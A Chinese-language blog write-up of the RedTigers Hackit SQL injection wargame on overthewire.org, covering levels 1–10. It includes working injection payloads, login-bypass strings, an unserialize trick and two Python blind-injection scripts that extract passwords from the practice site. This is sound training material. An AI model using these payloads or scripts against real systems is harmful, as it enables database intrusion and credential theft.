---
layout:		post
title:		RedTigers Hackit
subtitle:	writeup
data:		2016-05-18
author:		"dogewatch"
header-img:	"img/post-bg-2015.jpg"
tags:
    - web
---

>

## LEVEL 1
很简单的注入，在cat=1后面用and 1=1, and 1=2判断存在注入后上order by，然后union select注出数据

```
http://redtiger.labs.overthewire.org/level1.php?cat=0 union select 1,2,username,password from level1_users
```

## LEVEL 2
万能密码，用户名a' or ''=' ，密码a' or ''='

## LEVEL 3
这题名叫get an error，刚开始以为是报错注入，无果，后来发现是利用php的报错得到部分源码。

```
http://redtiger.labs.overthewire.org/level3.php?usr[]=MTI5MTY0MTczMTY5MTc0
Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21
```

查看这个inc文件，可以看到usr参数的加解密方法。将字符串```' union select 1,username,3,4,5,password,7 from level3_users where username='Admin```加密后得到Admin的密码。

## LEVEL 4
这题是个盲注，用and 1=1, and 1=2判断存在注入后，用length判断长度，然后写脚本一位一位地跑出数据。

```
#!/usr/bin/env python
# encoding: utf-8


import requests
s = requests.session()

str='abcdefghijklmnopqrstuvwxyz0123456789'
headers = {'Cookie': 'level2login=; level3login=; level4login='}
result = ''

for x in range(1, 18):
    for i in str:
        url="http://redtiger.labs.overthewire.org/level4.php?id=0 union select 1,keyword from level4_secret where ascii(substring(keyword,%i,1))= %i" % (x, ord(i))
        r = s.get(url, headers=headers)
        if "1 rows" in r.content:
            print i
            result += i
            break

print result
```

## LEVEL 5
常规的万能密码在这不好使，看到提示说密码是32位md5值，估计是后台对第二个值做了长度判断，于是用如下payload成功登录。

```
username=' union select 1,md5(1)#&password=1&login=Login
```

## LEVEL 6
试出sql返回数据有5列，然后发现左右括号被过滤了，填充字符发现报错：

```
http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,'a',3,4,5
Warning: mysql_fetch_object(): supplied argument is not a valid MySQL result resource in /var/www/hackit/level6.php on line 27 User not found
```

将字符转为十六进制表示方式就没有爆粗了，但是什么数据也没有，当试到‘Admin‘的十六进制表示时发现有反应了，于是猜测是用第二列的数据又做了一次查询。然后将一下字符串转为十六进制填充到第二列中得到数据：

```
' union select 1,username,3,password,5 from level6_users where id=3#
```

## LEVEL 7

这题让我学到了一个新姿势。首先发现除了提示的几个函数被过滤掉了外，常用的几个注释符也被过滤了，不过影响不大，先用```search=Google%' and 1=1 and '%'='&dosearch=search!```判断注入点，然后用```Google%' and length(news.autor)=17 and '%'='```找出长度。接着就是用脚本盲注了，除了被过滤的几个函数外，我们可以用locate函数来一位一位地判断数据。在注入过程中发现这个表的内容大小写不敏感，查资料知道用```collate latin1_general_cs```可以区分出大小写(新姿势get)，下面是脚本：

```
#!/usr/bin/env python
# encoding: utf-8


import requests
s = requests.session()

str='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
headers = {'Cookie': 'level2login=; level3login=; level4login=d; level5login=; level6login=; level7login='}
result = ''
flag = False

for x in range(1, 18):
    for i in str:
        url="http://redtiger.labs.overthewire.org/level7.php"
        search = "Google%%' and locate('%s',news.autor collate latin1_general_cs,%d)=%d and '%%'='" % (i, x, x)
        payload = {'search': search, 'dosearch': 'search!'}
        print payload
        r = s.post(url, headers=headers, data=payload)
        if "SAN FRANCISCO" in r.content:
            flag = True
            result += i
            print result
            break

print result
```

## LEVEL 8
挨个加引号发现email处存在注入，根据报错的内容可以看到这个sql语句的大致格式，然后构造

```
email=', name=password,icq='&name=Hans&icq=12345&age=25&edit=Edit
```

可以让name处显示password。

## LEVEL 9
挨个测试发现textarea处存在注入，填入```'),('```发现报错：Column count doesn't match value count at row 2，随后试出后面的括号中有3列数据，于是构造payload:

```
'), ((select username from level9_users limit 1), (select password from level9_users limit 1),'
```

## LEVEL 10
点击login，抓包发现login参数的数据长得像base64加密的内容，解密得到：
```a:2:{s:8:"username";s:6:"Monkey";s:8:"password";s:12:"0815password";}```
将username的值改为TheMaster，注意前面的长度。但是password的值不知道怎么弄，尝试改为bool类型，没想到居然过了。

## 尾声
因为周末有个比赛，而一直以来注入这一块就是短板，所以打算找个东西练练手，学到了新的姿势很开森啊。